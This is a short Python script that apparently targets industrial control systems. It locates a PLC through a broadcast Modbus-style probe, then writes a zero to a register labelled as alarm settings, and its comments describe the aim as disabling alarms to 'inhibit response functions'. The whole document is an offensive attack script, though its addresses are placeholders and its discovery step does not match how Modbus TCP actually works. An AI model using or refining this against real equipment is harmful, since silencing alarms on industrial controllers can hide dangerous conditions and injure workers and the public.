import socket
import struct
import sys

# Function to find the PLC's IP address in the network
def find_plc_ip():
    # Define the broadcast address and port for the PLC discovery
    broadcast_address = "255.255.255.255"
    plc_port = 502  # Default Modbus TCP port

    # Create a UDP socket for broadcasting
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2)  # Set timeout for response

    # Send a discovery packet (example: Modbus discovery)
    discovery_packet = b"\x00\x01\x00\x00\x00\x06\x01\x04\x00\x00\x00\x01"  # Example Modbus request
    sock.sendto(discovery_packet, (broadcast_address, plc_port))

    # Wait for a response from the PLC
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("PLC not found in the network.")
        return None

# Function to modify alarm settings on the PLC
def modify_alarm_settings(plc_ip):
    # Connect to the PLC (example: using a Modbus TCP library)
    from pymodbus.client.sync import ModbusTcpClient

    try:
        # Create a Modbus TCP client
        client = ModbusTcpClient(plc_ip)
        client.connect()

        # Example: Modify alarm settings (specific register/coil addresses)
        # This is highly dependent on the PLC model and configuration
        alarm_setting_address = 0x1000  # Example address for alarm settings
        new_alarm_value = 0  # Example: Disable alarms

        # Write the new alarm setting to the PLC
        client.write_register(address=alarm_setting_address, value=new_alarm_value, unit=1)
        print("Alarm settings modified successfully.")

        # Close the connection
        client.close()
    except Exception as e:
        print(f"Error modifying alarm settings: {e}")

# Main script execution
if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()

    if plc_ip:
        # Step 2: Modify the alarm settings to inhibit response functions
        modify_alarm_settings(plc_ip)
    else:
        print("Cannot proceed without the PLC's IP address.")
        sys.exit(1)